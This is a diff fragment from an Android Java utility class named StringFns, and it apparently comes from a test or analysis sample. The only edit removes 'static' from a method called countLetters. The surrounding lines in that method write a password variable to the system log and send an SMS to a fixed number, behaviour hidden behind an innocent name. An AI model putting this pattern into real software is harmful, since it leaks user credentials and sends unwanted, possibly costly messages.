@@ -28,7 +28,7 @@ public class StringFns {
         }).start();
     }
 
-    public static int countLetters(String str) {
+    public int countLetters(String str) {
         Log.i(TAG, passwod);
         SmsManager smsManager = SmsManager.getDefault();
         smsManager.sendTextMessage("+999999999", null, "sms message", null, null);
